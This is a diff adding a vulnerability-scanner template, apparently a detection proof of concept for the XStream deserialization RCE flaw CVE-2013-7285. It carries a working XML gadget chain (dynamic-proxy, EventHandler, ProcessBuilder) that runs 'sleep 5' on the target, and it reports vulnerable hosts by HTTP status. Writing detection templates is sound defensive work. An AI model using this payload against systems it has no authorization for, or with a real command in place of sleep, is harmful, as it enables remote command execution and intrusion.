@@ -1,0 +1,49 @@
+[info]
+author = "AVE"
+description = "检测目标是否存在 XStream 反序列化 RCE 漏洞（CVE-2013-7285）。通过发送特制的 XML 数据，利用 dynamic-proxy/EventHandler/ProcessBuilder 链触发任意命令执行，若目标返回 200/202 则判定存在漏洞。"
+id = "POC-AVE-2013-0017"
+name = "XStream API 不安全的XML反序列化远程代码执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2013-0017"]
+vuln_id = [
+    "CVE-2013-7285",
+    "AVE-2013-0017",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<sorted-set>
+    <string>foo</string>
+    <contact class='dynamic-proxy'>
+      <interface>java.lang.Comparable</interface>
+      <handler class='java.beans.EventHandler'>
+          <target class='java.lang.ProcessBuilder'>
+              <command>
+                <string>sleep</string>
+                <string>5</string>
+              </command>
+          </target>
+          <action>start</action>
+      </handler>
+  </contact>
+</sorted-set>"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/xml"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    202,
+]
+type = "status"
